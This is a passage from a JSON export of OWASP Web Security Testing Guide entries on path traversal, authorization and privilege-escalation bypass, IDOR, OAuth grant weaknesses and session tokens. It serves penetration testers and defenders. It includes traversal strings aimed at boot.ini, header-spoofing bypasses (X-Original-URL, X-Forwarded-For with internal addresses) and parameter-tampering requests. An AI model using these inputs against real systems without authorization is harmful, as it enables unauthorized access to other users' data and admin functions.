machine:\\\\.\\CdRom0\\</li></ul><p>When the analysis is performed with a gray-box testing approach, testers have to follow the same methodology as in black-box testing. However, since they can review the source code, it is possible to search the input vectors more easily and accurately. During a source code review, they can use simple tools (such as the grep command) to search for one or more common patterns within the application code: inclusion functions/methods, filesystem operations, and so on.</p><ul><li>PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...</li><li>JSP/Servlet: java.io.File(), java.io.FileReader(), ...</li><li>ASP: include file, include virtual, ...</li></ul><p>Using online code search engines (e.g., Searchcode ), it may also be possible to find path traversal flaws in Open Source software published on the internet.</p><p>For PHP, testers can use the following regex:</p><pre><code>(include|require)(_once)?\\s*['\"(]?\\s*\\$_(GET|POST|COOKIE)</code></pre><p>Using the gray-box testing method, it is possible to discover vulnerabilities that are usually harder to discover, or even impossible to find during a standard black-box assessment.</p><p>Some web applications generate dynamic pages using values and parameters stored in a database. It may be possible to insert specially crafted path traversal strings when the application adds data to the database. This kind of security problem is difficult to discover due to the fact the parameters inside the inclusion functions seem internal and safe but are not in reality.</p><p>Additionally, by reviewing the source code it is possible to analyze the functions that are supposed to handle invalid input: some developers try to change invalid input to make it valid, avoiding warnings and errors. These functions are usually prone to security flaws.</p><p>Consider a web application with these instructions:</p><pre><code>filename = Request . QueryString ( \"file\" ); Replace ( filename , \"/\" , \" \\\" );\nReplace(filename, \" .. \\ \",\"\");</code></pre><p>Testing for the flaw is achieved by:</p><pre><code>file=....//....//boot.ini\nfile=....\\\\....\\\\boot.ini\nfile= ..\\..\\boot.ini</code></pre>",
        "tools": "<h3>Tools</h3><ul><li>DotDotPwn - The Directory Traversal Fuzzer</li><li>Path Traversal Fuzz Strings (from WFuzz Tool)</li><li>ZAP</li><li>Burp Suite</li><li>Encoding/Decoding tools</li><li>String searcher “grep”</li><li>DirBuster</li></ul><h3>References</h3><ul><li>PayloadsAllTheThings - Directory Traversal</li><li>PayloadsAllTheThings - File Inclusion</li></ul><ul><li>phpBB Attachment Mod Directory Traversal HTTP POST Injection</li><li>Windows File Pseudonyms: Pwnage and Poetry</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-ATHZ-02": {
        "summary": "<h3>Summary</h3><p>This kind of test focuses on verifying how the authorization schema has been implemented for each role or privilege to get access to reserved functions and resources.</p><p>For every specific role the tester holds during the assessment and for every function and request that the application executes during the post-authentication phase, it is necessary to verify:</p><ul><li>Is it possible to access that resource even if the user is not authenticated?</li><li>Is it possible to access that resource after the log-out?</li><li>Is it possible to access functions and resources that should be accessible to a user that holds a different role or privilege?</li></ul><p>Try to access the application as an administrative user and track all the administrative functions.</p><ul><li>Is it possible to access administrative functions if the tester is logged in as a non-admin user?</li><li>Is it possible to use these administrative functions as a user with a different role and for whom that action should be denied?</li></ul><h3>Test Objectives</h3><ul><li>Assess if horizontal or vertical access is possible.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Access resources and conduct operations horizontally.</li><li>Access resources and conduct operations vertically.</li></ul><p>For every function, specific role, or request that the application executes, it is necessary to verify:</p><ul><li>Is it possible to access resources that should be accessible to a user that holds a different identity with the same role or privilege?</li><li>Is it possible to operate functions on resources that should be accessible to a user that holds a different identity?</li></ul><p>For each role:</p><p>For example, suppose that the viewSettings function is part of every account menu of the application with the same role, and it is possible to access it by requesting the following URL: https://www.example.com/account/viewSettings . Then, the following HTTP request is generated when calling the viewSettings function:</p><pre><code>POST /account/viewSettings HTTP / 1.1 Host : www.example.com [other HTTP headers] Cookie : SessionID=USER_SESSION username=example_user</code></pre><p>Valid and legitimate response:</p><pre><code>HTTP1.1 200 OK\n[other HTTP headers]\n\n{\n  \"username\": \"example_user\",\n  \"email\": \" [email protected] \",\n  \"address\": \"Example Address\"\n}</code></pre><p>The attacker may try and execute that request with the same username parameter:</p><pre><code>POST /account/viewCCpincode HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=ATTACKER_SESSION\n\nusername=example_user</code></pre><p>If the attacker’s response contain the data of the example_user , then the application is vulnerable for lateral movement attacks, where a user can read or write other user’s data.</p><p>For example, suppose that the addUser function is part of the administrative menu of the application, and it is possible to access it by requesting the following URL https://www.example.com/admin/addUser .</p><p>Then, the following HTTP request is generated when calling the addUser function:</p><pre><code>POST /admin/addUser HTTP / 1.1 Host : www.example.com [...] userID=fakeuser&role=3&group=grp001</code></pre><p>Further questions or considerations would go in the following direction:</p><ul><li>What happens if a non-administrative user tries to execute that request?</li><li>Will the user be created?</li><li>If so, can the new user use their privileges?</li></ul><p>Various applications setup resource controls based on user roles. Let’s take an example resumes or CVs (curriculum vitae) uploaded on a careers form to an S3 bucket.</p><p>As a normal user, try accessing the location of those files. If you are able to retrieve them, modify them, or delete them, then the application is vulnerable.</p><p>Some applications support non-standard headers such as X-Original-URL or X-Rewrite-URL in order to allow overriding the target URL in requests with the one specified in the header value.</p><p>This behavior can be leveraged in a situation in which the application is behind a component that applies access control restriction based on the request URL.</p><p>The kind of access control restriction based on the request URL can be, for example, blocking access from internet to an administration console exposed on /console or /admin .</p><p>To detect the support for the header X-Original-URL or X-Rewrite-URL , the following steps can be applied.</p><pre><code>GET / HTTP / 1.1 Host : www.example.com [...]</code></pre><pre><code>GET / HTTP/1.1\nHost: www.example.com\nX-Original-URL: /donotexist1\n[...]</code></pre><pre><code>GET / HTTP/1.1\nHost: www.example.com\nX-Rewrite-URL: /donotexist2\n[...]</code></pre><p>If the response for either request contains markers that the resource was not found, this indicates that the application supports the special request headers. These markers may include the HTTP response status code 404, or a “resource not found” message in the response body.</p><p>Once the support for the header X-Original-URL or X-Rewrite-URL was validated then the tentative of bypass against the access control restriction can be leveraged by sending the expected request to the application but specifying a URL “allowed” by the frontend component as the main request URL and specifying the real target URL in the X-Original-URL or X-Rewrite-URL header depending on the one supported. If both are supported then try one after the other to verify for which header the bypass is effective.</p><p>Often admin panels or administrative related bits of functionality are only accessible to clients on local networks, therefore it may be possible to abuse various proxy or forwarding related HTTP headers to gain access. Some headers and values to test with are:</p><ul><li>Headers:X-Forwarded-ForX-Forward-ForX-Remote-IPX-Originating-IPX-Remote-AddrX-Client-IP</li><li>X-Forwarded-For</li><li>X-Forward-For</li><li>X-Remote-IP</li><li>X-Originating-IP</li><li>X-Remote-Addr</li><li>X-Client-IP</li><li>Values127.0.0.1(or anything in the127.0.0.0/8or::1/128address spaces)localhostAnyRFC1918address:10.0.0.0/8172.16.0.0/12192.168.0.0/16Link local addresses:169.254.0.0/16</li><li>127.0.0.1(or anything in the127.0.0.0/8or::1/128address spaces)</li><li>localhost</li><li>AnyRFC1918address:10.0.0.0/8172.16.0.0/12192.168.0.0/16</li><li>10.0.0.0/8</li><li>172.16.0.0/12</li><li>192.168.0.0/16</li><li>Link local addresses:169.254.0.0/16</li></ul><ul><li>X-Forwarded-For</li><li>X-Forward-For</li><li>X-Remote-IP</li><li>X-Originating-IP</li><li>X-Remote-Addr</li><li>X-Client-IP</li></ul><ul><li>127.0.0.1(or anything in the127.0.0.0/8or::1/128address spaces)</li><li>localhost</li><li>AnyRFC1918address:10.0.0.0/8172.16.0.0/12192.168.0.0/16</li><li>10.0.0.0/8</li><li>172.16.0.0/12</li><li>192.168.0.0/16</li><li>Link local addresses:169.254.0.0/16</li></ul><ul><li>10.0.0.0/8</li><li>172.16.0.0/12</li><li>192.168.0.0/16</li></ul><p>Note: Including a port element along with the address or hostname may also help bypass edge protections such as web application firewalls, etc.\nFor example: 127.0.0.4:80 , 127.0.0.4:443 , 127.0.0.4:43982</p>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)ZAP add-on: Access Control Testing</li><li>ZAP add-on: Access Control Testing</li><li>Port Swigger Burp SuiteBurp extension: AuthMatrixBurp extension: Autorize</li><li>Burp extension: AuthMatrix</li><li>Burp extension: Autorize</li></ul><ul><li>ZAP add-on: Access Control Testing</li></ul><ul><li>Burp extension: AuthMatrix</li><li>Burp extension: Autorize</li></ul><h3>References</h3><p>OWASP Application Security Verification Standard 4.0.1 , v4.0.1-1, v4.0.1-4, v4.0.1-9, v4.0.1-16</p>",
        "remediation": "<h3>Remediation</h3><p>Employ the least privilege principles on the users, roles, and resources to ensure that no unauthorized access occurs.</p>",
        "test_objectives": ""
    },
    "WSTG-ATHZ-03": {
        "summary": "<h3>Summary</h3><p>This section describes the issue of escalating privileges from one stage to another. During this phase, the tester should verify that it is not possible for a user to modify their privileges or roles inside the application in ways that could allow privilege escalation attacks.</p><p>Privilege escalation occurs when a user gets access to more resources or functionality than they are normally allowed, and such elevation or changes should have been prevented by the application. This is usually caused by a flaw in the application. The result is that the application performs actions with more privileges than those intended by the developer or system administrator.</p><p>The degree of escalation depends on what privileges the attacker is authorized to possess, and what privileges can be obtained in a successful exploit. For example, a programming error that allows a user to gain extra privilege after successful authentication limits the degree of escalation, because the user is already authorized to hold some privilege. Likewise, a remote attacker gaining superuser privilege without any authentication presents a greater degree of escalation.</p><p>Usually, people refer to vertical escalation when it is possible to access resources granted to more privileged accounts (e.g., acquiring administrative privileges for the application), and to horizontal escalation when it is possible to access resources granted to a similarly configured account (e.g., in an online banking application, accessing information related to a different user).</p><h3>Test Objectives</h3><ul><li>Identify injection points related to privilege manipulation.</li><li>Fuzz or otherwise attempt to bypass security measures.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>In every portion of the application where a user can create information in the database (e.g., making a payment, adding a contact, or sending a message), can receive information (statement of account, order details, etc.), or delete information (drop users, messages, etc.), it is necessary to record that functionality. The tester should try to access such functions as another user in order to verify if it is possible to access a function that should not be permitted by the user’s role/privilege (but might be permitted as another user).</p><p>For example:\nThe following HTTP POST allows the user that belongs to grp001 to access order #0001:</p><pre><code>POST /user/viewOrder.jsp HTTP / 1.1 Host : www.example.com ... groupID=grp001&orderID=0001</code></pre><p>Verify if a user that does not belong to grp001 can modify the value of the parameters groupID and orderID to gain access to that privileged data.</p><p>For example:\nThe following server’s answer shows a hidden field in the HTML returned to the user after a successful authentication.</p><pre><code>HTTP/1.1 200 OK\nServer: Netscape-Enterprise/6.0\nDate: Wed, 1 Apr 2006 13:51:20 GMT\nSet-Cookie: USER=aW78ryrGrTWs4MnOd32Fs51yDqp; path=/; domain=www.example.com\nSet-Cookie: SESSION=k+KmKeHXTgDi1J5fT7Zz; path=/; domain= www.example.com\nCache-Control: no-cache\nPragma: No-cache\nContent-length: 247\nContent-Type: text/html\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close <form name= \"autoriz\" method= \"POST\" action = \"visual.jsp\" > <input type= \"hidden\" name= \"profile\" value= \"SysAdmin\" > \\ <body onload= \"document.forms.autoriz.submit()\" > </td> </tr></code></pre><p>What if the tester modifies the value of the variable profile to SysAdmin ? Is it possible to become administrator ?</p><p>For example:\nIn an environment where the server sends an error message contained as a value in a specific parameter in a set of answer codes, as the following:</p><pre><code>@0`1`3`3``0`UC`1`Status`OK`SEC`5`1`0`ResultSet`0`PVValid`-1`0`0` Notifications`0`0`3`Command  Manager`0`0`0` StateToolsBar`0`0`0`\nStateExecToolBar`0`0`0`FlagsToolBar`0</code></pre><p>The server gives an implicit trust to the user. It believes that the user will answer with the above message closing the session.</p><p>In this condition, verify that it is not possible to escalate privileges by modifying the parameter values. In this particular example, by modifying the PVValid value from -1 to 0 (no error conditions), it may be possible to authenticate as administrator to the server.</p><p>Some sites limit access or count the number of failed login attempts based on IP address.</p><p>For example:</p><pre><code>X-Forwarded-For: 8.1.1.1</code></pre><p>In this case, if the site uses the value of X-forwarded-For as client IP address, tester may change the IP value of the X-forwarded-For HTTP header to workaround the IP source identification.</p><p>A vertical authorization bypass is specific to the case that an attacker obtains a role higher than their own. Testing for this bypass focuses on verifying how the vertical authorization schema has been implemented for each role. For every function, page, specific role, or request that the application executes, it is necessary to verify if it is possible to:</p><ul><li>Access resources that should be accessible only to a higher role user.</li><li>Operate functions on resources that should be operative only by a user that holds a higher or specific role identity.</li></ul><p>For each role:</p><p>The following table illustrates the system roles on a banking site. Each role binds with specific permissions for the event menu functionality:</p><p>The application will be considered vulnerable if the:</p><p>Suppose that the deleteEvent function is part of the administrator account menu of the application, and it is possible to access it by requesting the following URL: https://www.example.com/account/deleteEvent . Then, the following HTTP request is generated when calling the deleteEvent function:</p><pre><code>POST /account/deleteEvent HTTP / 1.1 Host : www.example.com [other HTTP headers] Cookie : SessionID=ADMINISTRATOR_USER_SESSION EventID=1000001</code></pre><p>The valid response:</p><pre><code>HTTP / 1.1 200 OK [other HTTP headers] {\"message\": \"Event was deleted\"}</code></pre><p>The attacker may try and execute the same request:</p><pre><code>POST /account/deleteEvent HTTP / 1.1 Host : www.example.com [other HTTP headers] Cookie : SessionID=CUSTOMER_USER_SESSION EventID=1000002</code></pre><p>If the response of the attacker’s request contains the same data {\"message\": \"Event was deleted\"} the application is vulnerable.</p><p>Suppose that the administrator menu is part of the administrator account.</p><p>The application will be considered vulnerable if any role other than administrator could access the administrator menu. Sometimes, developers perform authorization validation at the GUI level only, and leave the functions without authorization validation, thus potentially resulting in a vulnerability.</p><p>Try to traverse the site and check if some of pages that may miss the authorization check.</p><p>For example:</p><pre><code>/../.././userInfo.html</code></pre><p>If the URL authorization check is only done by partial URL match, then it’s likely testers or hackers may workaround the authorization by URL encoding techniques.</p><p>For example:</p><pre><code>startswith(), endswith(), contains(), indexOf()</code></pre><h3>References</h3><ul><li>Wikipedia - Privilege Escalation</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-ATHZ-04": {
        "summary": "<h3>Summary</h3><p>Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files.\nInsecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more. This is caused by the fact that the application takes user supplied input and uses it to retrieve an object without performing sufficient authorization checks.</p><h3>Test Objectives</h3><ul><li>Identify points where object references may occur.</li><li>Assess the access control measures and if they’re vulnerable to IDOR.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>To test for this vulnerability the tester first needs to map out all locations in the application where user input is used to reference objects directly. For example, locations where user input is used to access a database row, a file, application pages and more. Next the tester should modify the value of the parameter used to reference objects and assess whether it is possible to retrieve objects belonging to other users or otherwise bypass authorization.</p><p>The best way to test for direct object references would be by having at least two (often more) users to cover different owned objects and functions. For example two users each having access to different objects (such as purchase information, private messages, etc.), and (if relevant) users with different privileges (for example administrator users) to see whether there are direct references to application functionality. By having multiple users the tester saves valuable testing time in guessing different object names as he can attempt to access objects that belong to the other user.</p><p>Below are several typical scenarios for this vulnerability and the methods to test for each:</p><p>Sample request:</p><pre><code>https://foo.bar/somepage?invoice=12345</code></pre><p>In this case, the value of the invoice parameter is used as an index in an invoices table in the database. The application takes the value of this parameter and uses it in a query to the database. The application then returns the invoice information to the user.</p><p>Since the value of invoice goes directly into the query, by modifying the value of the parameter it is possible to retrieve any invoice object, regardless of the user to whom the invoice belongs. To test for this case the tester should obtain the identifier of an invoice belonging to a different test user (ensuring he is not supposed to view this information per application business logic), and then check whether it is possible to access objects without authorization.</p><p>Sample request:</p><pre><code>https://foo.bar/changepassword?user=someuser</code></pre><p>In this case, the value of the user parameter is used to tell the application for which user it should change the password. In many cases this step will be a part of a wizard, or a multi-step operation. In the first step the application will get a request stating for which user’s password is to be changed, and in the next step the user will provide a new password (without asking for the current one).</p><p>The user parameter is used to directly reference the object of the user for whom the password change operation will be performed. To test for this case the tester should attempt to provide a different test username than the one currently logged in, and check whether it is possible to modify the password of another user.</p><p>Sample request:</p><pre><code>https://foo.bar/showImage?img=img00011</code></pre><p>In this case, the value of the file parameter is used to tell the application what file the user intends to retrieve. By providing the name or identifier of a different file (for example file=image00012.jpg) the attacker will be able to retrieve objects belonging to other users.</p><p>To test for this case, the tester should obtain a reference the user is not supposed to be able to access and attempt to access it by using it as the value of file parameter. Note: This vulnerability is often exploited in conjunction with a directory/path traversal vulnerability (see Testing for Path Traversal )</p><p>Sample request:</p><pre><code>https://foo.bar/accessPage?menuitem=12</code></pre><p>In this case, the value of the menuitem parameter is used to tell the application which menu item (and therefore which application functionality) the user is attempting to access. Assume the user is supposed to be restricted and therefore has links available only to access to menu items 1, 2 and 3. By modifying the value of menuitem parameter it is possible to bypass authorization and access additional application functionality. To test for this case the tester identifies a location where application functionality is determined by reference to a menu item, maps the values of menu items the given test user can access, and then attempts other menu items.</p><p>In the above examples the modification of a single parameter is sufficient. However, sometimes the object reference may be split between more than one parameter, and testing should be adjusted accordingly.</p><h3>References</h3><p>Top 10 2013-A4-Insecure Direct Object References</p>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-ATHZ-05": {
        "summary": "<h3>Summary</h3><p>OAuth2.0 (hereinafter referred to as OAuth) is an authorization framework that allows a client to access resources on the behalf of its user.</p><p>In order to achieve this, OAuth heavily relies on tokens to communicate between the different entities, each entity having a different role :</p><ul><li>Resource Owner:The entity who grants access to a resource, the owner, and in most cases is the user themselves</li><li>Client:The application that is requesting access to a resource on behalf of the Resource Owner. These clients come in twotypes:Public:clients that can’t protect a secret (e.g.frontend focused applications, such as SPAs, mobile applications, etc.)Confidential:clients that are able to securely authenticate with the authorization server by keeping their registered secrets safe (e.g.backend services)</li><li>Public:clients that can’t protect a secret (e.g.frontend focused applications, such as SPAs, mobile applications, etc.)</li><li>Confidential:clients that are able to securely authenticate with the authorization server by keeping their registered secrets safe (e.g.backend services)</li><li>Authorization Server:The server that holds authorization information and grants the access</li><li>Resource Server:The application that serves the content accessed by the client</li></ul><ul><li>Public:clients that can’t protect a secret (e.g.frontend focused applications, such as SPAs, mobile applications, etc.)</li><li>Confidential:clients that are able to securely authenticate with the authorization server by keeping their registered secrets safe (e.g.backend services)</li></ul><p>Since OAuth’s responsibility is to delegate access rights by the owner to the client, this is a very attractive target for attackers, and bad implementations lead to unauthorized access to the users’ resources and information.</p><p>In order to provide access to a client application, OAuth relies on several authorization grant types to generate an access token:</p><ul><li>Authorization Code: used by both confidential and public clients to exchange an authorization code for an access token, but recommended only for confidential clients</li><li>Proof Key for Code Exchange (PKCE): PKCE builds on top of the Authorization Code grant, providing stronger security for it to be used by public clients, and improving the posture of confidential ones</li><li>Client Credentials: used for machine to machine communication, where the “user” here is the machine requesting access to its own resources from the Resource Server</li><li>Device Code: used for devices with limited input capabilities.</li><li>Refresh Token: tokens provided by the authorization server to allow clients to refresh users’ access tokens once they become invalid or expire. This grant type is used in conjunction with one other grant type.</li></ul><p>Two flows will be deprecated in the release of OAuth2.1 , and their usage is not recommended:</p><ul><li>Implicit Flow*: PKCE’s secure implementation renders this flow obsolete. Prior to PKCE, the implicit flow was used by client-side applications such assingle page applicationssinceCORSrelaxed thesame-origin policyfor sites to inter-communicate. For more information on why the implicit grant is not recommended, review thissection.</li><li>Resource Owner Password Credentials:used to exchange users’ credentials directly with the client, which then sends them to the authorization to exchange them for an access token. For information on why this flow is not recommended, review thissection.</li></ul><p>*: The implicit flow in OAuth only is deprecated, yet is still a viable solution within Open ID Connect (OIDC) to retrieve id_tokens . Be careful to understand how the implicit flow is being used, which can be identified if only the /authorization endpoint is being used to gain an access token, without relying on /token endpoint in any way. An example on this can be found here .</p><p>Please note that OAuth flows are a complex topic, and the above includes only a summary of the key areas. The inline references contain further information about the specific flows.</p><h3>Test Objectives</h3><ul><li>Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Deprecated grant types were obsoleted for security and functionality reasons. Identifying if they’re being used allows us to quickly review if they’re susceptible to any of the threats pertaining to their usage. Some might be out of scope to the attacker, such as the way a client might be using the users’ credentials. This should be documented and raised to the internal engineering teams.</p><p>For public clients, it is generally possible to identify the grant type in the request to the /token endpoint. It is indicated in the token exchange with the parameter grant_type .</p><p>The following example shows the Authorization Code grant with PKCE.</p><pre><code>POST /oauth/token HTTP / 1.1 Host : as.example.com [...] {\n  \"client_id\":\"example-client\",\n  \"code_verifier\":\"example\",\n  \"grant_type\":\"authorization_code\",\n  \"code\":\"example\",\n  \"redirect_uri\":\"https://client.example.com\"\n}</code></pre><p>The values for the grant_type parameter and the grant type they indicate are:</p><ul><li>password: Indicates the ROPC grant.</li><li>client_credentials: Indicates the Client Credential grant.</li><li>authorization_code: Indicates the Authorization Code grant.</li></ul><p>The Implicit Flow type is not indicated by the grant_type parameter since the token is presented in the response to the /authorization endpoint request, and instead can be identified through the response_type . Below is an example.</p><pre><code>GET /authorize\n  ?client_id=<some_client_id>\n  &response_type=token \n  &redirect_uri=https%3A%2F%2Fclient.example.com%2F\n  &scope=openid%20profile%20email\n  &state=<random_state></code></pre><p>The following URL parameters indicate the OAuth flow being used:</p><ul><li>response_type=token: Indicates Implicit Flow, as the client is directly requesting from the authorization server to return a token.</li><li>response_type=code: Indicates Authorization Code flow, as the client is requesting from the authorization server to return a code, that will be exchanged afterwards with a token.</li><li>code_challenge=sha256(xyz): Indicates the PKCE extension, as no other flow uses this parameter.</li></ul><p>The following is an example authorization request for Authorization Code flow with PKCE:</p><pre><code>GET /authorize\n    ?redirect_uri=https%3A%2F%2Fclient.example.com%2F\n    &client_id=<some_client_id>\n    &scope=openid%20profile%20email\n    &response_type=code\n    &response_mode=query\n    &state=<random_state>\n    &nonce=<random_nonce>\n    &code_challenge=<random_code_challenge>\n    &code_challenge_method=S256 HTTP/1.1\nHost: as.example.com\n[...]</code></pre><p>The Authorization Code grant with PKCE extension is recommended for public clients. An authorization request for Authorization Code flow with PKCE should contain response_type=code and code_challenge=sha256(xyz) .</p><p>The token exchange should contain the grant type authorization_code and a code_verifier .</p><p>Improper grant types for public clients are:</p><ul><li>Authorization Code grant without the PKCE extension</li><li>Client Credentials</li><li>Implicit Flow</li><li>ROPC</li></ul><p>The Authorization Code grant is recommended for confidential clients. The PKCE extension may be used as well.</p><p>Improper grant types for confidential clients are:</p><ul><li>Client Credentials (Except for machine-to-machine – see below)</li><li>Implicit Flow</li><li>ROPC</li></ul><p>In situations where no user interaction occurs and the clients are only confidential clients, the Client Credentials grant may be used.</p><p>If you know the client_id and client_secret , it is possible to obtain a token by passing the client_credentials grant type.</p><pre><code>$ curl --request POST \\ --url https://as.example.com/oauth/token \\ --header 'content-type: application/json' \\ --data '{\"client_id\":\"<some_client_id>\",\"client_secret\":\"<some_client_secret>\",\"grant_type\":\"client_credentials\"}' --proxy https://localhost:8080/ -k</code></pre><p>Depending on the flow, OAuth transports several types of credentials in as URL parameters.</p><p>The following tokens can be considered to be leaked credentials:</p><ul><li>access token</li><li>refresh token</li><li>authorization code</li><li>PKCE code challenge / code verifier</li></ul><p>Due to how OAuth works, the authorization code as well as the code_challenge , and code_verifier may be part of the URL. The implicit flow transports the authorization token as part of the URL if the response_mode is not set to form_post . This may lead to leakage of the requested token or code in the referrer header, in log files, and proxies due to these parameters being passed either in the query or the fragment.</p><p>The risk that’s carried by the implicit flow leaking the tokens is far higher than leaking the code or any other code_* parameters, as they are bound to specific clients and are harder to abuse in case of leakage.</p><p>In order to test this scenario, make use of an HTTP intercepting proxy such as ZAP and intercept the OAuth traffic.</p><ul><li>Step through the authorization process and identify any credentials present in the URL.</li><li>If any external resources are included in a page involved with the OAuth flow, analyze the request made to them. Credentials could be leaked in the referrer header.</li></ul><p>After stepping through the OAuth flow and using the application, a few requests are captured in the request history of an HTTP intercepting proxy. Search for the HTTP referrer header (e.g. Referer: https://idp.example.com/ ) containing the authorization server and client URL in the request history.</p><p>Reviewing the HTML meta tags (although this tag is not supported on all browsers), or the Referrer-Policy could help assess if any credential leakage is happening through the referrer header.</p><h3>Related Test Cases</h3><ul><li>Testing JSON Web Tokens</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>BurpSuite</li><li>EsPReSSO</li><li>ZAP</li></ul><h3>References</h3><ul><li>User Authentication with OAuth 2.0</li><li>The OAuth 2.0 Authorization Framework</li><li>The OAuth 2.0 Authorization Framework: Bearer Token Usage</li><li>OAuth 2.0 Threat Model and Security Considerations</li><li>OAuth 2.0 Security Best Current Practice</li><li>Authorization Code Flow with Proof Key for Code Exchange</li></ul>",
        "remediation": "<h3>Remediation</h3><ul><li>When implementing OAuth, always consider the technology used and whether the application is a server-side application that can avoid revealing secrets, or a client-side application that cannot.</li><li>In almost any case, use the Authorization Code flow with PKCE. One exception may be machine-to-machine flows.</li><li>Use POST parameters or header values to transport secrets.</li><li>When no other possibilities exists (for example, in legacy applications that can not be migrated), implement additional security headers such as aReferrer-Policy.</li></ul>",
        "test_objectives": ""
    },
    "WSTG-SESS-01": {
        "summary": "<h3>Summary</h3><p>One of the core components of any web-based application is the mechanism by which it controls and maintains the state for a user interacting with it. To avoid continuous authentication for each page of a site or service, web applications implement various mechanisms to store and validate credentials for a pre-determined timespan. These mechanisms are known as Session Management.</p><p>In this test, the tester wants to check that cookies and other session tokens are created in a secure and unpredictable way. An attacker who is able to predict and forge a weak cookie can easily hijack the sessions of legitimate users.</p><p>Cookies are used to implement session management and are described in detail in RFC 2965. In a nutshell, when a user accesses an application which needs to keep track of the actions and identity of that user across multiple requests, a cookie (or cookies) is generated by the server and sent to the client. The client will then send the cookie back to the server in all following connections until the cookie expires or is destroyed. The data stored in the cookie can provide to the server a large spectrum of information about who the user is, what actions he has performed so far, what his preferences are, etc. therefore providing a state to a stateless protocol like HTTP.</p><p>A typical example is provided by an online shopping cart. Throughout the session of a user, the application must keep track of his identity, his profile, the products that he has chosen to buy, the quantity, the individual prices, the discounts, etc. Cookies are an efficient way to store and pass this information back and forth (other methods are URL parameters and hidden fields).</p><p>Due to the importance of the data that they store, cookies are therefore vital in the overall security of the application. Being able to tamper with cookies may result in hijacking the sessions of legitimate users, gaining higher privileges in an active session, and in general influencing the operations of the application in an unauthorized way.</p><p>In this test the tester has to check whether the cookies issued to clients can resist a wide range of attacks aimed to interfere with the sessions of legitimate users and with the application itself. The overall goal is to be able to forge a cookie that will be considered valid by the application and that will provide some kind of unauthorized access (session hijacking, privilege escalation, …).</p><p>Usually the main steps of the attack pattern are the following:</p><ul><li>cookie collection: collection of a sufficient number of cookie samples;</li><li>cookie reverse engineering: analysis of the cookie generation algorithm;</li><li>cookie manipulation: forging of a valid cookie in order to perform the attack. This last step might require a large number of attempts, depending on how the cookie is created (cookie brute-force attack).</li></ul><p>Another pattern of attack consists of overflowing a cookie. Strictly speaking, this attack has a different nature, since here testers are not trying to recreate a perfectly valid cookie. Instead, the goal is to overflow a memory area, thereby interfering with the correct behavior of the application and possibly injecting (and remotely executing) malicious code.</p><h3>Test Objectives</h3><ul><li>Gather session tokens, for the same user and for different users where possible.</li><li>Analyze and ensure that enough randomness exists to stop session forging attacks.</li><li>Modify cookies that are not signed and contain information that can be manipulated.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>All interaction between the client and application should be tested at least against the following criteria:</p><ul><li>Are allSet-Cookiedirectives tagged asSecure?</li><li>Do any Cookie operations take place over unencrypted transport?</li><li>Can the Cookie be forced over unencrypted transport?</li><li>If so, how does the application maintain security?</li><li>Are any Cookies persistent?</li><li>WhatExpirestimes are used on persistent cookies, and are they reasonable?</li><li>Are cookies that are expected to be transient configured as such?</li><li>What HTTP/1.1Cache-Controlsettings are used to protect Cookies?</li><li>What HTTP/1.0Cache-Controlsettings are used to protect Cookies?</li></ul><p>The first step required to manipulate the cookie is to understand how the application creates and manages cookies. For this task, testers have to try to answer the following questions:</p><ul><li>How many cookies are used by the application?Surf the application. Note when cookies are created. Make a list of received cookies, the page that sets them (with the set-cookie directive), the domain for which they are valid, their value, and their characteristics.</li><li>Which parts of the application generate or modify the cookie?Surfing the application, find which cookies remain constant and which get modified. What events modify the cookie?</li><li>Which parts of the application require this cookie in order to be accessed and utilized?Find out which parts of the application need a cookie. Access a page, then try again without the cookie, or with a modified value of it. Try to map which cookies are used where.</li></ul><p>How many cookies are used by the application?</p><p>Surf the application. Note when cookies are created. Make a list of received cookies, the page that sets them (with the set-cookie directive), the domain for which they are valid, their value, and their characteristics.</p><p>Which parts of the application generate or modify the cookie?</p><p>Surfing the application, find which cookies remain constant and which get modified. What events modify the cookie?</p><p>Which parts of the application require this cookie in order to be accessed and utilized?</p><p>Find out which parts of the application need a cookie. Access a page, then try again without the cookie, or with a modified value of it. Try to map which cookies are used where.</p><p>A spreadsheet mapping each cookie to the corresponding application parts and the related information can be a valuable output of this phase.</p><p>The session tokens (Cookie, SessionID or Hidden Field) themselves should be examined to ensure their quality from a security perspective. They should be tested against criteria such as their randomness, uniqueness, resistance to statistical and cryptographic analysis and information leakage.</p><ul><li>Token Structure & Information Leakage</li></ul><p>The first stage is to examine the structure and content of a Session ID provided by the application. A common mistake is to include specific data in the Token instead of issuing a generic value and referencing real data server-side.</p><p>If the Session ID is clear-text, the structure and pertinent data may be immediately obvious such as 192.168.100.1:owaspuser:password:15:58 .</p><p>If part or the entire token appears to be encoded or hashed, it should be compared to various techniques to check for obvious obfuscation. For example the string 192.168.100.1:owaspuser:password:15:58 is represented in hex, base64, and as an MD5 hash:</p><ul><li>Hex:3139322E3136382E3130302E313A6F77617370757365723A70617373776F72643A31353A3538</li><li>Base64:MTkyLjE2OC4xMDAuMTpvd2FzcHVzZXI6cGFzc3dvcmQ6MTU6NTg=</li><li>MD5:01c2fc4f0a817afd8366689bd29dd40a</li></ul><p>Having identified the type of obfuscation, it may be possible to decode back to the original data. In most cases, however, this is unlikely. Even so, it may be useful to enumerate the encoding in place from the format of the message. Furthermore, if both the format and obfuscation technique can be deduced, automated brute-force attacks could be devised.</p><p>Hybrid tokens may include information such as IP address or User ID together with an 